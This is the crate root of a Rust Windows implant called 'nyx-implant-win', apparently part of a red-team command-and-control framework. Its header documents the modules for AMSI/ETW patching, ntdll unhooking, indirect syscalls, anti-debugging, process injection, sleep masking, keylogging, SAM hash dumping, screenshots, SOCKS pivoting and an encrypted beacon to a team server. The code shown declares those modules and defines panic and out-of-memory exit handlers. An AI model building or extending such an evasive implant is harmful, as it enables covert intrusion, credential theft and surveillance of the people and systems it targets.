//! nyx-implant-win — Windows position-independent implant.
//!
//! This crate builds the real Windows PIC agent: `#![no_std]` + `#![no_main]`,
//! a custom NT-Heap allocator, PEB-walk API resolution, indirect syscalls, and
//! a task loop that reuses [`nyx_protocol`] for the encrypted beacon frame.
//!
//! ## Build
//! Requires nightly + the `x86_64-pc-windows-gnu` (or msvc) target. It is
//! intentionally NOT a workspace member so `cargo build --workspace` stays green
//! on the macOS dev host. Check it standalone:
//!
//! ```text
//! cargo +nightly check -p nyx-implant-win --target x86_64-pc-windows-gnu
//! ```
//!
//! Full link + the sRDI PIC-extraction step happen on a Windows host.
//!
//! ## Modules
//! - [`heap`] — alloc glue (Vec/String + a raw-byte `Str`) for the PEB walk.
//! - [`ntalloc`] — bump allocator over `NtAllocateVirtualMemory`, registered as
//!   the `#[global_allocator]` (the `NtHeapAllocator` name is historical).
//! - [`resolve`] — PEB walk + djb2 API resolution; `LiveNtdll` impls
//!   `nyx_evasion::SyscallSource` so the SSN resolver runs over the *live* ntdll.
//! - [`syscalls`] — indirect-syscall runtime (SSN table + ntdll `syscall;ret`
//!   gadget + RX trampoline); 4/6/11-arg wrappers + a process-wide global.
//! - [`unhook`] — KnownDlls `\ntdll` fresh-map (+ disk fallback) unhook.
//! - [`blind`] — AMSI/ETW userland byte-patch (idempotent; AMSI retried/cycle).
//! - [`antidebug`] — BeingDebugged / ProcessDebugPort / uptime checks.
//! - [`kits`] — CS-style kit seams: `SleepmaskKit`/`ProcessInjectKit` (real
//!   P2 impls via `evasion_glue`). [`stack`]/[`sleep`]/[`mem`] are the matching
//!   live modules (call-stack spoof / sleep mask / memory encryption).
//! - [`config`] — per-build encrypted config (`nyx_config_macros::embed!`).
//! - [`beacon`] — the task loop (check-in → POST → receive → execute); every
//!   wire `Command`. [`envelopes`] bakes the malleable-C2 shapes it sends.
//! - [`transport`] — WinHTTP POST for the beacon frame (TLS via WINHTTP_FLAG_SECURE).
//! - [`hostinfo`] — real `SessionInfo` (hostname/user/pid/admin/beacon_id).
//! - [`fs`] / [`shell`] / [`recon`] — file ops (NT syscalls), shell, recon.
//! - [`bof`] — W^X COFF loader + Beacon-API shims.
//! - [`screenshot`] / [`keylog`] / [`hashdump`] — screen, polling keys, SAM hive.
//! - [`pivot`] / [`postex`] — SOCKS relay across cycles / token ops.
//! - [`entry`] / [`selftests`] — PIC entry + per-module `rundll32` self-tests.

#![cfg_attr(not(test), no_std)]
#![cfg_attr(not(test), no_main)]
// `#[alloc_error_handler]` is a nightly language feature (still unstable as of
// the pinned toolchain era — see the Rust Unstable Book `alloc-error-handler`
// page). It replaces the default no_std OOM path (a nounwind panic that the
// `#[panic_handler]` would abort on) with the recoverable handler below. Only
// needed for the shipped no_std build; test mode links std.
#![cfg_attr(not(test), feature(alloc_error_handler))]

extern crate alloc;

// Team server long-term pubkey, baked at build time by build.rs (H7). A real
// engagement sets NYX_SERVER_PUB; dev builds fall back to a marked test key.
// Either way it is a valid (non-identity) X25519 point so the ECDH no longer
// collapses and session keys are genuinely derived.
mod server_pub {
    include!(concat!(env!("OUT_DIR"), "/server_pub.rs"));
}

pub mod heap;

#[cfg(target_os = "windows")]
pub mod antidebug;
#[cfg(target_os = "windows")]
pub mod beacon;
#[cfg(target_os = "windows")]
pub mod cell;

pub mod cfg_user;

#[cfg(target_os = "windows")]
pub mod blind;
#[cfg(target_os = "windows")]
pub mod blind_hwbp;
#[cfg(target_os = "windows")]
pub mod bof;
#[cfg(target_os = "windows")]
pub mod caller_spoof;
#[cfg(target_os = "windows")]
pub mod channels;
#[cfg(target_os = "windows")]
pub mod config;
#[cfg(target_os = "windows")]
pub mod config_placeholder;
#[cfg(target_os = "windows")]
pub mod context;
#[cfg(target_os = "windows")]
pub mod dllmain;
#[cfg(target_os = "windows")]
pub mod entry;
#[cfg(target_os = "windows")]
pub mod env_keying;
#[cfg(target_os = "windows")]
pub mod envelopes;
#[cfg(target_os = "windows")]
pub mod envprobe;
#[cfg(target_os = "windows")]
pub mod evasion_glue;
pub mod fluctuation;
pub mod fluctuation_thunk;
pub mod fmt;
#[cfg(target_os = "windows")]
pub mod fs;
#[cfg(target_os = "windows")]
pub mod hashdump;
#[cfg(target_os = "windows")]
pub mod hookchain;
#[cfg(target_os = "windows")]
pub mod hostinfo;
pub mod inject;
#[cfg(target_os = "windows")]
pub mod insomniac;
#[cfg(target_os = "windows")]
pub mod keylog;
#[cfg(target_os = "windows")]
pub mod kits;
#[cfg(target_os = "windows")]
pub mod lacuna;
#[cfg(target_os = "windows")]
pub mod lacuna_stomp;
#[cfg(target_os = "windows")]
pub mod mem;
#[cfg(target_os = "windows")]
pub mod ntalloc;
#[cfg(target_os = "windows")]
pub mod pivot;
#[cfg(target_os = "windows")]
pub mod postex;
#[cfg(target_os = "windows")]
pub mod proxy_veh;
#[cfg(target_os = "windows")]
pub mod recon;
#[cfg(target_os = "windows")]
pub mod resolve;
#[cfg(target_os = "windows")]
pub mod screenshot;
#[cfg(target_os = "windows")]
pub mod selftests;
#[cfg(target_os = "windows")]
pub mod shell;
#[cfg(target_os = "windows")]
pub mod sleep;
#[cfg(target_os = "windows")]
pub mod stack;
#[cfg(target_os = "windows")]
pub mod syscalls;
#[cfg(target_os = "windows")]
pub mod tp;
#[cfg(target_os = "windows")]
pub mod transport;
#[cfg(target_os = "windows")]
pub mod trex;
#[cfg(target_os = "windows")]
pub mod unhook;
#[cfg(target_os = "windows")]
pub mod version;

// Register the NT-Heap allocator so Vec/String work under #![no_std].
// In test mode (std available), use the default allocator — the NT allocator
// would crash because Rust's std runtime allocates before init_global() is called.
#[cfg(all(target_os = "windows", not(test)))]
#[global_allocator]
static HEAP: ntalloc::NtHeapAllocator = ntalloc::NtHeapAllocator;

#[cfg(not(test))]
#[panic_handler]
fn _panic(info: &core::panic::PanicInfo) -> ! {
    // panic = abort. In a PIC implant an infinite spin is a loud IOC (one core
    // pinned at 100%), so prefer a clean process exit. We can only resolve
    // ExitProcess on Windows; on the dev host (no target_os=windows) trap.
    #[cfg(target_os = "windows")]
    {
        // Best-effort: resolve ExitProcess and exit with a non-zero code so the
        // host/loader reaps us. If resolution fails (catastrophic — ntdll gone),
        // fall through to the trap.
        if let Some(addr) = unsafe { resolve::export_addr(b"kernel32.dll", b"ExitProcess") } {
            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(addr) };
            // Touch `info` so it's "used" and not dropped with a warning.
            let _ = info;
            f(0xC000_0001);
        }
    }
    // Defensive trap — only reached if we can't exit cleanly.
    let _ = info;
    loop {
        core::hint::spin_loop();
    }
}

/// Size (bytes) of the most recent failed allocation, or 0 if none was ever
/// recorded. Set by [`_alloc_error`] before the beacon enters its safe error
/// state; it is the observable "minimal error flag" this architecture allows.
/// A real error FRAME is not possible from the OOM path: encoding, sealing,
/// and POSTing a frame all allocate (wire `Writer`, AEAD output, WinHTTP
/// buffers), and we are already inside the allocation-failure path — see
/// [`_alloc_error`] for the full rationale.
static ALLOC_OOM_SIZE: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);

/// Last recorded allocation-failure size (0 = no OOM observed since boot).
/// Intended for diagnostics / a future in-process watchdog; not consulted by
/// any shipped hot path.
pub fn alloc_oom_size() -> u64 {
    ALLOC_OOM_SIZE.load(core::sync::atomic::Ordering::Relaxed)
}

/// Allocation-failure handler (the modern `#[alloc_error_handler]`; OOM is no
/// longer an abort on this toolchain — rustc routes `handle_alloc_error` here
/// when the attribute is present, else to a default nounwind panic).
///
/// # Recoverable-OOM design (what the no_std architecture allows)
/// The handler MUST diverge (`-> !`), so the beacon loop cannot resume after
/// an OOM. What we CAN do without allocating:
///   1. record the failed size in [`ALLOC_OOM_SIZE`] (the minimal error flag),
///   2. drop a `diag_mark` (allocation-free; compile-time no-op in production
///      builds) so nyx_diag builds leave a marker,
///   3. exit cleanly with a DEDICATED exit code (`0xAD`) instead of the
///      default path's panic → `ExitProcess(0xC000_0001)`. The distinct code
///      lets the loader/harness tell an OOM apart from a crash and restart the
///      beacon — the recoverable outcome for the operator.
/// A wire error frame is intentionally NOT attempted: every step of the
/// existing send path (`encode_batch` → `encode_frame` → `dispatch_send_recv`)
/// allocates, and re-entering it from inside the allocator-failure path would
/// recurse into the OOM handler.
#[cfg(not(test))]
#[alloc_error_handler]
fn _alloc_error(layout: core::alloc::Layout) -> ! {
    ALLOC_OOM_SIZE.store(layout.size() as u64, core::sync::atomic::Ordering::Relaxed);
    #[cfg(target_os = "windows")]
    {
        crate::entry::diag_mark(b"ERR_ALLOC_OOM");
        // Best-effort clean exit with the dedicated OOM code. If ExitProcess
        // can't be resolved (catastrophic — ntdll/kernel32 gone), fall through
        // to the defensive trap, mirroring the panic handler.
        if let Some(addr) = unsafe { resolve::export_addr(b"kernel32.dll", b"ExitProcess") } {
            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(addr) };
            f(0xAD);
        }
    }
    // Defensive trap — only reached if we can't exit cleanly.
    loop {
        core::hint::spin_loop();
    }
}
